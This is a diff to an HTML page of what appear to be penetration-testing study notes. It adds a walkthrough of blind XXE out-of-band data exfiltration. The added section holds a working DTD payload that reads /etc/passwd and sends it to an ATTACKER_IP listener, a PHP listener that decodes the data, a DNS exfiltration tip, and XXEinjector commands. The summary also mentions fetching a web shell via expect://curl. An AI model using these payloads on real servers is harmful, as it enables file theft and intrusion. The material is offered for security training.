@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-674b2f7c.js";
+            window.path_to_searchindex_js = "searchindex-2109f646.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-7371516b.js"></script>
+        <script src="toc-a5a7655f.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -28166,6 +28166,7 @@ $result = $conn-&gt;query($query);
 <li><a href="#intro-to-xxe-injection">Intro to XXE — XML structure, DTD, internal/external entities, the external entity file-read primitive</a></li>
 <li><a href="#xxe--local-file-disclosure">XXE local file disclosure — identifying XXE, reading files/source code, RCE via expect/curl, SSRF, DoS</a></li>
 <li><a href="#xxe--advanced-file-disclosure">XXE advanced file disclosure — CDATA + parameter entities + external DTD, error-based XXE</a></li>
+<li><a href="#xxe--blind-data-exfiltration">XXE blind data exfiltration — OOB via HTTP, PHP listener, DNS OOB, XXEinjector</a></li>
 <li><a href="#idor--bypassing-encoded-references">IDOR — Bypassing Encoded References — MD5/Base64 schemes, function disclosure, reproducing hashes, mass enumeration script</a></li>
 </ul>
 <h2 id="summary-11"><a class="header" href="#summary-11">Summary</a></h2>
@@ -28180,6 +28181,7 @@ $result = $conn-&gt;query($query);
 <p><strong>XXE Injection</strong> targets web applications that parse user-supplied XML (SOAP APIs, web forms, file uploads) using XML parsers that allow external entity resolution. XML documents can define <strong>external entities</strong> via the <code>SYSTEM</code> keyword (<code>&lt;!ENTITY name SYSTEM "file:///etc/passwd"&gt;</code>); when the server parses the document and substitutes entity references in its response, the contents of local files are returned to the attacker. The DTD mechanism (<code>&lt;!DOCTYPE&gt;</code>) is what makes this possible — it allows entities to be defined inline before the parser processes the document body. Understanding the core XML primitives (elements, attributes, entities, DTD declarations) is prerequisite to constructing XXE payloads.</p>
 <p><strong>XXE local file disclosure</strong> starts by confirming entity injection: insert an inline DTD with an internal entity and check whether the reflected value in the response is substituted (<code>Inlane Freight</code>) or literal (<code>&amp;company;</code>). Once confirmed, switch to an external <code>SYSTEM</code> entity pointing to <code>file:///etc/passwd</code> to read server files. PHP source code containing special XML characters can be read using <code>php://filter/convert.base64-encode/resource=index.php</code> — the base64 output is safe to embed in XML. RCE is possible via <code>expect://</code> (PHP only, module rarely enabled) or by using <code>expect://curl$IFS</code> to fetch and write a web shell; <code>$IFS</code> substitutes for spaces to avoid breaking XML syntax. XXE also enables <strong>SSRF</strong> (internal URL probing) and a <strong>Billion Laughs DoS</strong> (exponential entity expansion) — though modern servers protect against the latter.</p>
 <p><strong>XXE advanced file disclosure</strong> covers two techniques for cases where basic <code>file://</code> fails or produces no output. <strong>CDATA + parameter entities</strong>: direct entity joining is blocked by the XML spec, but if all entities are declared in an <strong>external DTD</strong> served from the attacker’s machine, they are treated as external and can be freely joined — assemble <code>&lt;![CDATA[ %file; ]]&gt;</code> in <code>xxe.dtd</code>, serve it with <code>python3 -m http.server</code>, and reference it with <code>&lt;!ENTITY % xxe SYSTEM "http://ATTACKER_IP/xxe.dtd"&gt;</code> followed by <code>%xxe;</code>; the <code>&amp;joined;</code> entity then returns raw file source without base64 or encoding. <strong>Error-based XXE</strong>: when no output is reflected but runtime errors are displayed, define a parameter entity that triggers an error containing the file contents (<code>%nonExistingEntity;/%file;</code>); the parser error message embeds the file data. Error-based output may be truncated and is less reliable than CDATA for source code, but works when there is nothing else to observe.</p>
+<p><strong>XXE blind data exfiltration (OOB)</strong> is used when no output and no errors are available. The target server is made to issue an HTTP request to the attacker’s listener, with the base64-encoded file content embedded as a query parameter: <code>%oob</code> builds the URL <code>http://ATTACKER_IP:8000/?content=%file;</code>, which fires when <code>&amp;content;</code> is referenced in the XML body. A PHP listener (<code>php -S 0.0.0.0:8000</code>) with an <code>index.php</code> that calls <code>base64_decode($_GET['content'])</code> auto-decodes the data on arrival. <strong>XXEinjector</strong> automates this: save the Burp request with <code>XXEINJECT</code> as the position marker, then run <code>ruby XXEinjector.rb --host=IP --httpport=8000 --file=req --path=/etc/passwd --oob=http --phpfilter</code>; results are saved to the <code>Logs/</code> directory. DNS OOB (encoding data as a subdomain, captured with <code>tcpdump</code>) is an alternative when HTTP egress is blocked.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="http-verb-tampering--bypassing-basic-authentication"><a class="header" href="#http-verb-tampering--bypassing-basic-authentication">HTTP Verb Tampering — Bypassing Basic Authentication</a></h1>
 <p>Exploiting insecure server configuration verb tampering is straightforward: try alternate HTTP methods and observe how the server handles them. Automated scanners catch this type reliably (auth bypass is obvious once it works), but miss the insecure-coding variant, which requires active testing.</p>
@@ -28683,6 +28685,75 @@ done
 <li>Less reliable than CDATA exfiltration for source code reading</li>
 <li>Requires the application to display unhandled runtime errors</li>
 </ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="xxe--blind-data-exfiltration"><a class="header" href="#xxe--blind-data-exfiltration">XXE — Blind Data Exfiltration</a></h1>
+<p>Used when the application returns no XML output and no runtime errors — none of the reflected or error-based techniques work.</p>
+<h2 id="out-of-band-oob-exfiltration"><a class="header" href="#out-of-band-oob-exfiltration">Out-of-band (OOB) exfiltration</a></h2>
+<p>Instead of reading file contents from the response, make the <strong>server send the data to you</strong> via an HTTP request. The file content is base64-encoded and placed as a URL parameter in a request that the target server makes to your listener.</p>
+<h3 id="step-1--create-xxedtd-on-your-machine"><a class="header" href="#step-1--create-xxedtd-on-your-machine">Step 1 — create <code>xxe.dtd</code> on your machine</a></h3>
+<pre><code class="language-xml">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"&gt;
+&lt;!ENTITY % oob "&lt;!ENTITY content SYSTEM 'http://ATTACKER_IP:8000/?content=%file;'&gt;"&gt;
+</code></pre>
+<ul>
+<li><code>%file</code> — reads and base64-encodes the target file</li>
+<li><code>%oob</code> — builds an HTTP URL with the encoded content as a query parameter; when triggered, the server requests this URL from your listener</li>
+</ul>
+<h3 id="step-2--create-a-php-listener-that-auto-decodes-indexphp"><a class="header" href="#step-2--create-a-php-listener-that-auto-decodes-indexphp">Step 2 — create a PHP listener that auto-decodes (<code>index.php</code>)</a></h3>
+<pre><code class="language-php">&lt;?php
+if (isset($_GET['content'])) {
+    error_log("\n\n" . base64_decode($_GET['content']));
+}
+?&gt;
+</code></pre>
+<h3 id="step-3--start-the-php-server"><a class="header" href="#step-3--start-the-php-server">Step 3 — start the PHP server</a></h3>
+<pre><code class="language-bash">php -S 0.0.0.0:8000
+</code></pre>
+<h3 id="step-4--send-the-xxe-payload-to-the-target"><a class="header" href="#step-4--send-the-xxe-payload-to-the-target">Step 4 — send the XXE payload to the target</a></h3>
+<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE email [
+  &lt;!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd"&gt;
+  %remote;
+  %oob;
+]&gt;
+&lt;root&gt;&amp;content;&lt;/root&gt;
+</code></pre>
+<p><code>&lt;root&gt;&amp;content;&lt;/root&gt;</code> triggers the <code>%oob</code> entity, which causes the server to issue the HTTP request containing the file data.</p>
+<h3 id="result"><a class="header" href="#result">Result</a></h3>
+<p>The PHP server log will show the decoded file contents:</p>
+<pre><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+</code></pre>
+<p><strong>Tip:</strong> DNS OOB exfiltration is an alternative — encode the file data as a subdomain (<code>ENCODEDTEXT.attacker.com</code>) and capture it with <code>tcpdump</code>. More complex but useful when HTTP egress is restricted.</p>
+<hr>
+<h2 id="automated-oob--xxeinjector"><a class="header" href="#automated-oob--xxeinjector">Automated OOB — XXEinjector</a></h2>
+<p><a href="https://github.com/enjoiz/XXEinjector">XXEinjector</a> automates basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE.</p>
+<h3 id="setup-5"><a class="header" href="#setup-5">Setup</a></h3>
+<pre><code class="language-bash">git clone https://github.com/enjoiz/XXEinjector.git
+</code></pre>
+<h3 id="prepare-the-request-file"><a class="header" href="#prepare-the-request-file">Prepare the request file</a></h3>
+<p>Copy the raw HTTP request from Burp into a file. Include only the first line of the XML body and add <code>XXEINJECT</code> as the injection position marker:</p>
+<pre><code class="language-http">POST /blind/submitDetails.php HTTP/1.1
+Host: TARGET_IP
+Content-Type: text/plain;charset=UTF-8
+...
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+XXEINJECT
+</code></pre>
+<h3 id="run"><a class="header" href="#run">Run</a></h3>
+<pre><code class="language-bash">ruby XXEinjector.rb \
+  --host=ATTACKER_IP \
+  --httpport=8000 \
+  --file=/tmp/xxe.req \
+  --path=/etc/passwd \
+  --oob=http \
+  --phpfilter
+</code></pre>
+<p><code>--phpfilter</code> applies the base64 PHP filter wrapper. Exfiltrated files are saved to <code>Logs/TARGET_IP/path/to/file.log</code>:</p>
+<pre><code class="language-bash">cat Logs/TARGET_IP/etc/passwd.log
+</code></pre>
+<p>The tool does not print base64-encoded data directly to stdout — check the Logs directory for results.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="intro-to-xxe-injection"><a class="header" href="#intro-to-xxe-injection">Intro to XXE Injection</a></h1>
 <p><strong>XML External Entity (XXE) Injection</strong> occurs when user-controlled XML input is parsed without proper sanitization, allowing an attacker to leverage XML features for malicious actions — from disclosing sensitive server files to shutting down the back-end. Ranked in OWASP’s Top 10.</p>
